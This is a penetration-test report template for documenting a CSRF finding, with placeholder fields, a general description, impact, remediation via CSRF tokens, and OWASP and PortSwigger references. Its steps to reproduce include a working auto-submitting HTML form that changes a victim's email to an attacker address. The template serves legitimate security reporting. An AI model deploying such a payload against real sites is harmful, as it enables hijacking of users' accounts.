---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# **CSRF (Cross Site Request Forgery)**

### **Vulnerability Name**

Cross-site request forgery for _\[Action]_ in _\[Module/Functionality]_

### **Vulnerability Description**

CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. This vulnerability targets functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something.&#x20;

Forcing the victim to retrieve data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim does. As such, CSRF attacks target state-changing requests.

> **Add your specific vulnerability description if required, the one given above is a general description.**

### **Steps to Reproduce**

1. Log in to the application.
2. Go to _\[Affected URL]_.
3. Create a CSRF payload by copying the code below into a new HTML file.
4. Save this HTML file.
5. From inside the same browser you logged in, open the HTML file in a new tab.
6. Once the page loads, the submit button will be clicked automatically.
7. Go back to the application tab and observe that the action as per the CSRF payload is performed.
8. This indicates that the application is vulnerable to CSRF attacks.


```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```


### **POC**

> **Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.**

### **Impact**

The attacker causes the victim user to act unintentionally. For example, this action might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

> **Add your specific impact if required, the one given above is a general impact.**

### **Remediation**

The most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token should be:

* Unpredictable with high entropy, as for session tokens in general.
* Tied to the user's session.
* Strictly validated in every case before the relevant action is executed.

> **Add your specific remediation if required, the above is a general remediation.**

### **Reference**

* [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html)
* [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
